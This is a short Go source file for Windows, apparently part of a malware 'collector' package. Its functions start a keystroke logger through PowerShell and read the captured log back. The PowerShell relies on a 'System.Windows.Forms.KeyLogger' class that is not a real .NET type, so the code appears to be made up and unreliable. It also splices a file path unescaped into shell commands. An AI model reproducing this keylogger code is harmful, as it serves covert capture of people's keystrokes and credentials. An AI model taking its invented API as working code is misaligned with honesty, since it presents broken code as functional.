//go:build windows

package collector

import (
"os/exec"
)

func CaptureKeylogs(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"$path = '"+outputPath+"'; $listener = New-Object System.Windows.Forms.KeyLogger; $listener.Start()\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CaptureKeylogsWithHook() bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"$listener = New-Object System.Windows.Forms.KeyLogger; $listener.Start()\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpKeylog(outputPath string) string {
cmd := exec.Command("cmd", "/c", "type "+outputPath)
output, err := cmd.Output()
if err != nil {
return ""
}
return string(output)
}
